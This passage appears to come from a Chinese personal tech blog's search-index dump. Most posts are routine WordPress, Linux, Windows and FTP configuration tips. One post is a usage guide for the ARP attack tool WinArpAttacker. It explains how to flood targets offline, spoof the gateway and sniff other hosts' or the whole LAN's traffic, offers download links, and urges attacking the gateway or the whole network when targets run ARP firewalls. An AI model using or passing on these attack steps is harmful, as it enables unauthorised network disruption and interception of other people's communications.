其留言与trackback中的链接自动添加nofollow属性。这样，可以使Spammer意图通过这种方式提高网站流行度的目标落空。 rel 这个属性它有许多的属性值，比如next、previous,、chapter、 section等等，比较常见的是rel=’external nofollow’与rel=’nofollow’两种参数的应用！ rel=’nofollow’属性是谷歌为了应对垃圾链接而引入的一个属性值，被各大搜索引擎引用！rel=’external nofollow’只是更相对于rel=’nofollow’参数更加规范一些而已！ rel=’external nofollow’与rel=’nofollow’其功能就中文译文”不要读取” 及”外部链接不要读取”的意思！ 一个稍微有点量的站经常有一堆不相关的评论链接,为杜绝这种垃圾尝甜头再来,最好就是默认给外部链接加上rel属性并加上external nofollow值来避免这个问题. 找到使用的模版目录下的&quot;functions.php&quot;文件，在?&gt;前加上如下代码: 1234567891011#非本站链接则加rel=&quot;external_nofollow&quot;function external_nofollow($content)&#123; preg_match_all(&#x27;|href=&quot;(.*?)&quot;|&#x27;,$content,$matches); if($matches)&#123; foreach($matches[1] as $val)&#123; if( strpos($val,home_url())===false &amp;amp;&amp;amp; (strpos($val,&#x27;http&#x27;) || strpos($val,&#x27;.&#x27;)) ) $content=str_replace(&quot;href=&quot;$val&quot;&quot;, &quot;href=&quot;$val&quot; rel=&quot;external nofollow&quot; &quot;,$content); &#125; &#125; return $content;&#125;add_filter(&#x27;the_content&#x27;,&#x27;external_nofollow&#x27;,999);","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"登陆后台提示您没有足够的权限访问该页面解决办法","slug":"wordpress-admin-no-permission","date":"2013-03-28T12:52:24.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"wordpress-admin-no-permission.html","permalink":"https://sobaigu.com/wordpress-admin-no-permission.html","excerpt":"","text":"如果出现&quot;您没有足够的权限访问该页面&quot;的问题,那猜你一定是新换了域名或数据库,把网站对应的表前缀也修改了.都说WordPress是设计缜密的程序,不能只改改表名就绕过安全验证的,不是吗? 修改了wp-config.php中的表前缀与新数据库表名对应后,还需要修改%_options,%_usermeta中和之前表名相关的数据项,这些可以打开phpadmin后台进行修改,这里整理一个mysql: 12UPDATE `table_name` SET `field_name` = replace (`field_name`,&#x27;from_str&#x27;,&#x27;to_str&#x27;)WHERE `field_name` LIKE &#x27;%from_str%&#x27; 注意table_name和field_name两边并不是单引号,是上点号,与~同一个键上的那个 ‘from_str’,'to_str’这俩才是单引号 根据以上语句,把之前和修改后的表名自行匹配修改,如我的数据库表名从&quot;wubasa_“改为&quot;baisogo_”,则执行以下SQL语句: 1234UPDATE `库`.`表头_options` SET `option_name` = replace(option_name,&#x27;wubasa&#x27;,&#x27;baisogo&#x27;)WHERE `option_name` LIKE &#x27;%wubasa%&#x27;&amp;lt;/pre&amp;gt;UPDATE `库`.`表头_usermeta` SET `meta_key` = replace(meta_key,&#x27;wubasa&#x27;,&#x27;baisogo&#x27;)WHERE `option_name` LIKE &#x27;%wubasa%&#x27; 完事用查询语句查询一把,看是否还有遗漏 1SELECT * FROM `baisogo_options` WHERE `option_name` LIKE &#x27;%wubasa%&#x27; 返回&quot;MySQL 返回的查询结果为空 (即零行)。 ( 查询花费 0.0006 秒 )&quot;,说明木有遗漏了.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"在SAE上搭建自己的Python版Blog[转]","slug":"sae-blog-with-python","date":"2013-03-24T13:33:00.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"sae-blog-with-python.html","permalink":"https://sobaigu.com/sae-blog-with-python.html","excerpt":"","text":"SAE的python功能当前已可用,且可以轻松绑定自己的域名,想体验一把只需以下几步： step1:下载python版blog step2:修改 config.yaml 和 setting.py 后上传 step3:在后台（1）初始化Mysql，（2）新建一个name为default的TaskQueue，（3）建立一个name 为 attachment的Storage domain step4:通过访问http://yourappid.sinaapp.com/install 来建立数据表，然后就大功告成。 创建自己的Python 应用 登陆到SAE 后台 创建一个Python 应用，如saepy，同时为这个应用创建一个版本，右边栏的应用管理/代码管理 点一下“通过这里创建一个版本.”输入一个版本号为“1” 使用SVN 管理应用 接着去学习一下如何使用SVN 来管理代码，下载一个TortoiseSVN 客户端，使用很方便。 TortoiseSVN 安装好后，在自己的电脑如D 盘下建立一个saeapp 文件夹，在saeapp下建立一个你刚才申请应用的文件夹，如saepy，对着saepy 点右键，点“SVN update”,按提示输入一些信息，若成功，则在saepy下会有一个文件夹“1”，里面有两个文件config.yaml、index.wsgi，这两个文件可以删除。 下载一款开源的SAE Python blog 程序解压后把文件夹“1”里的文件都复制到上面的同名文件夹“1”下， 只需修改 config.yaml 文件的第二行，把 name: saepy 改为你自己申请到的 appid， 保存对该文件夹“1”，点右键，点“SVN Commit”，在第一个大框随便输入一个信息，如“new”，注意要把“Select / deselect all”前的小框勾上，这才使新增加的文件上传到SAE。附另外一种上传代码的方法： 如果你嫌SVN麻烦，可以用“上传代码包”的方式上传，先修改相关文件，如setting.py 再按下文 开通SAE 相关服务， 然后进入SAE 后台，其“代码管理”里有个“上传代码包”的选项，点它即可。 上传代码包需注意： 只支持上传zip、 gz、tar.gz三种代码包，文件大小不能超过20MB，同名文件将会被覆盖。上传后的目录结构将跟压缩包内的目录结构保持一致。 我没试过，感谢kupo尝试了这个方法。 开通SAE相关服务 上传后打开你的应用地址 xxx.sinaapp.com 出现“500: Internal Server Error”错误提示，这是因为还没有在SAE 后台开通一些服务，这个blog 应用需要用到的三个服务需要在后台手动开通。 1）开通Mysql 服务管理/MySQL 点击“点此初始化Mysql”，等5秒钟就完成了。 2）开通Task Queue 服务管理/TaskQueue 点“创建队列&quot;, 队列名：default 类型：顺序队列 Level：队列等级 选Level 1 失败回调URL：可不填 点创建，瞬间完成 3）开通Storage 服务管理/TaskQueue 点“新建一个domain”， domain name 为 attachment 勾选缓存过期时间，设为365天 开通上面三个服务后打开你的应用地址安装：http://xxxx.sinaappp.com/install（如果出现错误就再刷新一次）,若安装成功就会出现 “博客已经成功安装了，现在就去 设置一个管理员帐号”提示。 配置自己的博客 现在博客的一些设置还是默认的设置， 还要修改 setting.py 里的信息，里面都有说明，修改后对setting.py 点右键，点SVN Commit，刷新网站就可以了。 可能会遇到以下问题: Traceback (most recent call last): File “/data1/www/htdocs/291/sobaigu.com/1/index.wsgi”, line 4, in from blog import urls as blogurls … File “/data1/www/htdocs/291/sobaigu.com/1/setting.py”, line 24 ANALYTICS_CODE = SyntaxError: invalid syntax 以上错误为修改setting.py时,添加的统计代码未在前后使用’''注释,修改的时候以为是要去掉注释的,谁知去掉了反而报错,加上注释就好了. Traceback (most recent call last): File “/usr/local/sae/python/lib/python2.7/site-packages/tornado/web.py”, line 954, in _execute … self.query(“SHOW WARNINGS”) ProgrammingError: (2014, “Commands out of sync; you can’t run this command now”) 这个实际上没什么错误,刷新你的网站前台页面即可. 参考文档:http://saepy.sinaapp.com/category/SAEpy-log/","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"chrome首页不断刷新解决办法","slug":"chrome-fresh-abnormal-homepage","date":"2013-03-21T13:51:55.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"chrome-fresh-abnormal-homepage.html","permalink":"https://sobaigu.com/chrome-fresh-abnormal-homepage.html","excerpt":"","text":"chrome用的好好的,然后退出重开,居然发现打开的不是我设置的标签页,打开的是google的首页&quot;http://www.google.com.hk/webhp?sourceid=chrome-instant&amp;amp;ion=1&amp;amp;ie=UTF-8&quot;,且一直不停地刷新,无法手动停止刷新,也不管设置成打开什么主页,给chrome添加启动参数等都无济于事. 以为是chrome升级新版本导致,找到chrome目录下的老的版本,打开问题依然. 再想到排查到扩展,可是全部禁用还是一样.回想起上次正常时编辑了下地址栏默认搜索引擎之前貌似有个什么提示,也没仔细看就关闭了. 百思不得其解,甚至怀疑自己的机器中毒,但中毒也应该跳转到有利可图的地址才对.返回搜索引擎修改,默认搜索引擎改百度与google都一样的结果… 突然看见默认搜索引擎设置选项下面有行: Enable Instant for faster searching (omnibox input may be logged) 中文翻译大概是&quot;启用即时搜索,以提高搜索速度&quot;或&quot;启用即搜即得功能,以提高搜索速度&quot;的意思,试着取消勾选,然后重启chrome,居然好了!!! 如果你连chrome://setting页都打不开,那就打开设置界面赶紧点击停止导航(就是刷新那按钮,导航未完成时显示的是个×,点击就是停止导航的意思 手还不够快?拔网线然后再打开设置界面总会吧?(^o^)/~","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"WinArpAttacker_局域网攻击神器_使用说明","slug":"software-lan-attacker-winarpattacker","date":"2013-03-19T02:28:52.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"software-lan-attacker-winarpattacker.html","permalink":"https://sobaigu.com/software-lan-attacker-winarpattacker.html","excerpt":"","text":"简介: WinArpAttacker是一个很出名的ARP攻击工具，功能也很强大，没有用过的朋友可以在上网搜一下，或者下方下载 这里先简单介绍一下这工具的基本用法。 1. 首先是下载软件，WinArpAttacker为单文件,无需安装,但需要WinPcap作为支持，所以你的机器得先安装WinPcap，包里提供的是4.0.2，不知道还有没有更新的版本。可能个别系统为了防止arp攻击做了免疫,导致winpcap无法正确安装,如提示错误请先下载Npptools.dll恢复到Windows目录即可 2. WinPcap安装完成,你就可以运行WinArpAttacker.exe了. 软件界面标准的Windows程序格局,没什么好介绍的. 程序启动后首先是要扫描局域网内机器,点击scan按钮就可以了.如果有机器的话将用列表展示.如果扫描不到机器,请确保你的网线已经连上.当然,也不能隔着路由,因为路由是可以隔绝局域网广播的. 攻击 此时若想攻击某个机器,请勾选,然后点击工具栏上attack按钮,可以选择下拉,里面有几个选项： Flood：连续并且大量地发送“Ip Conflict”包（此功能有可能会导致对方DOWN机,所以刚开始对准目标时三板斧首选此方法,先把对方轰趴下,之后再慢慢收拾） BanGateway：发包欺骗网关，告诉网关错误的目标机MAC地址，导致目标机无法接收到网关发送的包.同时也会给目标机器一个错误的网关MAC地址,相当于双向欺骗. Ip Conflict：发送一个IP一样但Mac地址不一样的包至目标机，导致目标机IP冲突。（频繁发送此包会导致机器断网），这个和第一功能的效果我就不截图了，如果被攻击，效果很明显，在你机器的右下角会有个IP冲突的标志…这里就不多说了。 Sniffgateway：同时ARP欺骗网关和目标机，使你可以监听目标机的通信。 SniffHosts：欺骗多个主机，使你可以监听他们之间的通信。 SniffLan：欺骗局域网的所有机器，说是你才是网关，然后通过这个你可以监听整个网络… 攻击之前,我们可以对攻击参数做一定的修改,主要是时间和数据包量的调整,比如flood攻击时,默认1000个数据包,可能效果不好,先到options里修改数据包为十万效果就有了,攻击时,将有日志提示你正在进行的行为,鼠标停在日志上将有通俗易懂的解释. 在此提醒大家,毕竟arp攻击是会加大网络负担的,一旦有攻击,尤其是互相攻击,整个网络都会受到牵连,最终也只是玉石俱焚,非迫不得已就不要随意攻击了. 有人会说，别人机器上都装了arp防火墙了，这东西没用。。。有句话叫世上没有十全十美，这话是真理。攻击不了防火墙里的机器也是事实，但活着不容易，寻死还不简单么？攻击网关或路由呗，或者整个网络疯狂攻击，在别人拔你网线前，只需要有死的决心和勇气便可！！ 保护 WinArpAttacker除了能进行攻击,也能进行自我防卫,当然,防御能力是有限的,就相当于ip-mac绑定吧. 按下detect按钮将启动探测arp攻击功能,默认每秒大于10个arp请求或者应答包将判断为攻击行为,程序会相应滚动日志提示.如果想修改对应参数,可以点击options按钮进行修改. 选择一个主机右键&gt;update arp table,将更新本地的arp缓存表,并在右下角显示,在右下角选择ip-mac,右键&gt;to staic可以进行ip-mac静态绑定,成功后type列显示static.当然,正如我前面所说,这个功能也只是相当于arp -s绑定,路由受欺骗的情况下也无能为力. 高级应用 软件提供了一个手动构造数据包的功能,有相关知识了解或有兴趣可以尝试下,可以构造任意arp包,权当学习吧. 更多数据包相关知识可以参考:捣鼓软件之:网络抓包利器-wireshark 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 h1nd","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"FTP服务器架设之Windows篇","slug":"ftp-server-in-windows","date":"2013-03-17T01:56:23.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"ftp-server-in-windows.html","permalink":"https://sobaigu.com/ftp-server-in-windows.html","excerpt":"","text":"之前记录了一篇Linux下搭建ftp服务器的日志,咱现在就来补上一篇Windows版的,Windows下的都是界面操作,软件都提供配置选择项的,所以老鸟到此可以飘过了. Windows下的ftp服务端软件较多,比如Serv-U,fliezilla server,Quick Easy FTP Server,Star FTP Server…等等,Star FTP Server之流更是傻瓜式,程序一个界面完成所有功能,用于局域网内跟别人临时分享点东西啥的是可以的,具体可以自己网上down一个看看. 在服务器领域,Serv-U和fliezilla server用的是比较广泛的,前者是要交费的,今天咱就介绍下免费的fliezilla server. fliezilla server虽然只有Windows版本,但它却是个开源项目,大名鼎鼎的FTP客户端软件fliezilla大家一定很熟悉,话不多说,直接步入最后的正题,照例直接明确需求: 匿名用户：只能访问部分资源,只有下载权限(如果对外网提供服务,建议不提供匿名访问 upload：只能上传,不可以下载 admin：可以对ftp进行所有的管理 对于以上需求,如果是很多人用,建议是建立三个这种不同权限的分组,然后建立用户分配到各自需要的分组,以便于管理. filezilla server上新建组和用户都没什么好说的,设定一个FTP根目录,如果是管理器组,就把所有的权限都勾选,如果只是下载用户,则设定文件read,文件夹list权限,如果只是上传用的账户,则至给与文件write,文件夹list权限,当然,也可以开放文件夹creat权限. 当然,以上权限设置可以针对某个文件夹进行设定,只需要在shared folder添加目录便可以单独设定权限了. 如果需要跨盘符目录共享,那么还需要做相对于FTP根目录的别名设置,选中添加的跨盘符或目录级别的共享目录,右键&gt;edit aliases(编辑别名),如设定的ftp根目录是G盘,想把D盘也可以通过ftp共享,那此时可以编辑别名为:G:\\D盘,保存配置后登陆ftp,就可见有个叫D盘的文件夹在ftp根目录下. 其他的以此类推,不在赘述. 在使用中可能会出现上传文件报错问题,请检查是不是上传的目录中含有中文,官方也有对应的支持ansi编码格式的补丁版本,但本人实践中发现并无改善,可以将目录改成非中文或压缩后上传即可.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"Linux命令cp覆盖文件不提示","slug":"linux-cp-notify","date":"2013-03-07T02:48:56.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"linux-cp-notify.html","permalink":"https://sobaigu.com/linux-cp-notify.html","excerpt":"","text":"新做了个vps，折腾网站cp覆盖时，无论加什么参数-f之类的还是提示是否覆盖，这在大量cp覆盖操作的时候是不能忍受的。 把a目录下的文件复制到b目录,就像下面这样： 1cp –r a/* b 执行上面的命令时，b存在的每个文件都会提示是否覆盖,增加不提示参数如下： 1cp –r –f a/* b 我们希望的理想状态是执行上面的命令时，b存在的每个文件都不再会提示,但是有时加了-f了，怎么还会有提示呢?原来一些服务器会默认增加别名 alias cp='cp -i'，当你执行cp时，其实执行的是cp –i。在终端执行alias就可以看出来了。 以下是代码片段： 123[root@devdb ~]# aliasalias cp=&#x27;cp -i&#x27; 可以这样解决,以下是代码片段： 1[root@devdb ~]# vi ~/.bashrc 在alias cp='cp -i'前加上#注释掉这行，：wq!保存推出，然后重新登陆就可以了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"ubuntu命令add-apt-repository: command not found解决办法","slug":"ubuntu-add-apt-repository-command-not-found","date":"2013-03-06T08:03:52.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"ubuntu-add-apt-repository-command-not-found.html","permalink":"https://sobaigu.com/ubuntu-add-apt-repository-command-not-found.html","excerpt":"有个破机器,cpu,内存都破,显卡都没,兴致勃勃装了个Ubuntu server LTS 12.04,准备搭建个公用的ftp服务器,也省得安装杀毒软件,结果问题一堆. 500 OOPS: vsftpd: refusing to run with writable root inside chroot() 等各种错误爆出来,满世界google,看到老外说搭了个PPA源,使用Ubuntu的添加PPA命令 sudo apt-get install python-software-properties","text":"有个破机器,cpu,内存都破,显卡都没,兴致勃勃装了个Ubuntu server LTS 12.04,准备搭建个公用的ftp服务器,也省得安装杀毒软件,结果问题一堆. 500 OOPS: vsftpd: refusing to run with writable root inside chroot() 等各种错误爆出来,满世界google,看到老外说搭了个PPA源,使用Ubuntu的添加PPA命令 sudo apt-get install python-software-properties 结果却提示 sudo: add-apt-repository: command not found 解决方法: 12345zzz@ftp:/etc/vsftpd$ add-apt-repositoryThe program &#x27;add-apt-repository&#x27; is currently not installed. You can install it by typing:sudo apt-get install python-software-properties 当出现某个命令未发现时,多半是没有安装软件包,此时只需要直接输入命令,Ubuntu就会提示安装方法,如有依赖关系也将一并在此安装,接下来就复制粘贴安装就可以了. 12345678910111213141516171819202122232425zzz@ftp:/etc/vsftpd$ sudo apt-get install python-software-propertiesReading package lists... DoneBuilding dependency treeReading state information... DoneThe following extra packages will be installed:python-pycurlSuggested packages:python-pycurl-dbgThe following NEW packages will be installed:python-pycurl python-software-properties0 upgraded, 2 newly installed, 0 to remove and 4 not upgraded.Need to get 71.4 kB of archives.After this operation, 416 kB of additional disk space will be used.Do you want to continue [Y/n]? yGet:1 http://cn.archive.Ubuntu.com/Ubuntu/ precise/main python-pycurl amd64 7.19.0-4Ubuntu3 [49.2 kB]Get:2 http://cn.archive.Ubuntu.com/Ubuntu/ precise-updates/main python-software-properties all 0.82.7.3 [22.3 kB]Fetched 71.4 kB in 0s (204 kB/s)Selecting previously unselected package python-pycurl.(Reading database ... 60895 files and directories currently installed.)Unpacking python-pycurl (from .../python-pycurl_7.19.0-4Ubuntu3_amd64.deb) ...Selecting previously unselected package python-software-properties.Unpacking python-software-properties (from .../python-software-properties_0.82.7.3_all.deb) ...Processing triggers for man-db ...Setting up python-pycurl (7.19.0-4Ubuntu3) ...Setting up python-software-properties (0.82.7.3) ...","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Ubuntu中英文locale设置","slug":"linux-locale-setting","date":"2013-02-27T23:22:36.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"linux-locale-setting.html","permalink":"https://sobaigu.com/linux-locale-setting.html","excerpt":"控制Ubuntu(应该所有的Linux版本都大同小异)环境的文件为: var/lib/locales/supported.d/local #系统语言支持字符集 /etc/default/locale #默认使用语言字符集 修改以上两个文件内容可达到改变Linux系统语言环境的目的.","text":"控制Ubuntu(应该所有的Linux版本都大同小异)环境的文件为: var/lib/locales/supported.d/local #系统语言支持字符集 /etc/default/locale #默认使用语言字符集 修改以上两个文件内容可达到改变Linux系统语言环境的目的. 123456789101112zgw@ftp:~$ cat /var/lib/locales/supported.d/local #系统语言支持字符集en_US.UTF-8 UTF-8#以上一行为英文local下默认,以下为支持中文编码添加zh_CN.UTF-8 UTF-8 &lt;/span&gt;zh_CN.GB18030 GB18030 &lt;/span&gt;zh_CN.GBK GBK &lt;/span&gt;8. &lt;span&gt;zgw@ftp:~$ cat /etc/default/locale #默认使用语言字符集9. &lt;span&gt;LANG=&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;en_US.UTF-8&quot;10. &lt;span&gt;LANGUAGE=&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;en_US:en&quot;#英文local默认,如需默认为中文显示,请更改为下面内容&quot;zh_CN.UTF-8″LANGUAGE=&quot;&lt;/span&gt;&lt;span&gt;zh_CN:zh&quot; 当然,有些系统安装时未选则中文支持,可能缺少语言包,还需安装相应语言包文件. 1sudo apt-get install language-pack-zh-han* 配置更改完成后,需要用以下命令重建locale 1sudo locale-gen 通过以上配置调整,我们可以实现英文local下支持中文显示,解决中文名目录或文件乱码显示的问题.或者安装英文local后中英文显示环境切换. 当然,某些软件中文显示问题可能还需要另外设置,如本博客另外一篇文章:Ubuntu11.10之后版本英文locate下gedit汉字乱码问题解决办法. 参考文档: 1.http://wlx.westgis.ac.cn/867 2.http://www.forever.tw/?p=166 3.http://www.360doc.com/content/13/0224/11/7775902_267580103.shtml 4.http://zhumeng8337797.blog.163.com/blog/static/10076891420109210304328/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"chm文件乱码解决方案","slug":"chm-error-encoding","date":"2013-02-24T23:24:04.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"chm-error-encoding.html","permalink":"https://sobaigu.com/chm-error-encoding.html","excerpt":"","text":"chm文件显示乱码，我们第一反应是编码方式不对,但要命的是不能手动选择编码方式，那怎么办呢？chm文件乱码解决方案如下： 打开cmd 输入regedit进入注册表,找到： HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\International 你会看到右边：AutoDetect 和 Default_CodePage 将AutoDetect设置为1（默认为0表示默认编码，设置为1表示自动检测） 注：在简体中文的操作系统上打开繁体中文的 chm文件乱码时，先把 AutoDetect 设置为0，然后把 Default_CodePage 设置为 BIG5 的代码页 950 另外,有时候我们打开chm时是无法显示状态,这一般是无法识别中文路径问题,可以把chm文件放到分区根目录下再打开查看.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"为WordPress编辑器设置默认内容","slug":"default-content-for-tinymce","date":"2013-02-23T00:37:11.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"default-content-for-tinymce.html","permalink":"https://sobaigu.com/default-content-for-tinymce.html","excerpt":"","text":"如果你希望每次写日志时都插入相同的文字内容，例如告诉读者订阅您的站点，通过下面的代码，会自动在编辑器中插入你想显示的内容。 将下面代码加到你的主题functions.php模版中： 123456789101112&lt;?phpadd_filter( &#x27;default_content&#x27;, &#x27;my_editor_content&#x27; );function my_editor_content( $content ) &#123; $content = &quot;This is some custom content I&#x27;m adding to the post editor because I hate re-typing it.&quot;; return $content;&#125;?&gt; 其中的文字你可以修改成任意的内容。 这是一个很蛋疼的小功能，但却是很实用的的技术。 原文地址","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"Beyond Compare添加到右键菜单","slug":"bcompare-into-right-content-menu","date":"2013-02-05T04:20:04.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"bcompare-into-right-content-menu.html","permalink":"https://sobaigu.com/bcompare-into-right-content-menu.html","excerpt":"","text":"Beyond Compare是个优秀的工具,我们经常用于对比文件和文件夹,右键点点就可以调用对比,着实很方便.在3.2版本之前,我们可以从设置中将bc关联到文件夹和文件右键,但之后的版本已经找不到此设置选项,我们只能通过其他方法将其添加到右键菜单. 没有此选项每次要先打开bc,然后再选择要比较的文件或文件夹,造成一定的麻烦,也不怎么习惯. 我们可以通过手动添加注册表的方式来解决. 为方便大家,线提供组织好的批处理一份,只需将批处理保存运行即可. 12345678910111213141516171819202122232425262728293031@ECHO OFFREM 将当前路径设为变量SET BC3PATH=%~DP0REM 创建用户配置文件，关闭初次启动程序时的设置向导IF NOT EXIST &quot;%USERPROFILE%\\Application Data\\Scooter Software\\Beyond Compare 3\\&quot; MD &quot;%USERPROFILE%\\Application Data\\Scooter Software\\Beyond Compare 3&quot;COPY /Y NUL &quot;%USERPROFILE%\\Application Data\\Scooter Software\\Beyond Compare 3\\BCState.xml&quot;(ECHO ^&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?^&gt;ECHO ^&lt;!-- Produced by Beyond Compare 3 from Scooter Software --^&gt;ECHO ^&lt;BCState^&gt;ECHO ^&lt;TBcState^&gt;ECHO ^&lt;FirstStartup Value=&quot;False&quot;/^&gt;ECHO ^&lt;FormPosStr Value=&quot;110;111;980;737&quot;/^&gt;ECHO ^&lt;/TBcState^&gt;ECHO ^&lt;/BCState^&gt;) &gt;&gt;&quot;%USERPROFILE%\\Application Data\\Scooter Software\\Beyond Compare 3\\BCState.xml&quot;REM 注册右键REG ADD &quot;HKCR\\shellex\\ContextMenuHandlers\\Cirrus\\ShellEx&quot; /ve /t REG_SZ /d &quot;&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /fREG ADD &quot;HKCR\\CLSID\\&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /ve /t REG_SZ /d &quot;CirrusShellEx&quot; /fREG ADD &quot;HKCR\\CLSID\\&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;\\InProcServer32&quot; /ve /t REG_SZ /d &quot;%BC3PATH%BCShellEx.dll&quot; /fREG ADD &quot;HKCR\\CLSID\\&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;\\InProcServer32&quot; /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /fREG ADD &quot;HKCR\\Directory\\shellex\\ContextMenuHandlers\\Cirrus\\ShellEx&quot; /ve /t REG_SZ /d &quot;&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /fREG ADD &quot;HKCR\\Folder\\shellex\\ContextMenuHandlers\\Cirrus\\ShellEx&quot; /ve /t REG_SZ /d &quot;&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /fREG ADD &quot;HKCR\\lnkfile\\shellex\\ContextMenuHandlers\\Cirrus\\ShellEx&quot; /ve /t REG_SZ /d &quot;&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /fREM 程序基本设置REG ADD &quot;HKCU\\Software\\Scooter Software\\Beyond Compare 3&quot; /v &quot;SupportsMerge&quot; /t REG_DWORD /d 0x1 /fREG ADD &quot;HKCU\\Software\\Scooter Software\\Beyond Compare 3\\BcShellEx&quot; /v &quot;Viewers&quot; /t REG_SZ /d &quot;Text Compare;Data Compare;Hex Compare;MP3 Compare;Picture Compare;Version Compare&quot; /fREG ADD &quot;HKCU\\Software\\Scooter Software\\Beyond Compare 3\\BcShellEx&quot; /v &quot;ArchiveMasks&quot; /t REG_SZ /d &quot;*.7z;*.7z.001;*.bcpkg;*.bcs;*.bcss;*.cab;*.chm;*.ear;*.gz;*.jar;*.rar;*.tar;*.tar.gz;*.tgz;*.war;*.zip;&quot; /fREM 注册右键REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved&quot; /v &quot;&#123;57FA2D12-D22D-490A-805A-5CB48E84F12A&#125;&quot; /t REG_SZ /d &quot;Beyond Compare 3 Shell Extension&quot; /fGOTO :EOF 如果需要取消右键,就相应的执行下面的批处理. 1234567reg delete &quot;HKLM\\Software\\Scooter Software&quot; /freg delete &quot;HKCU\\Software\\Scooter Software&quot; /freg delete &quot;HKCR\\.bcpkg&quot; /freg delete &quot;HKCR\\BeyondCompare.SettingsPackage&quot; /freg delete &quot;HKCR\\.bcss&quot; /ve /t REG_SZ /d &quot;BeyondCompare.Snapshot&quot; /freg delete &quot;HKCR\\BeyondCompare.Snapshot&quot; /freg delete &quot;HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Application\\Beyond Compare 3&quot; /f","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"Linux VPS 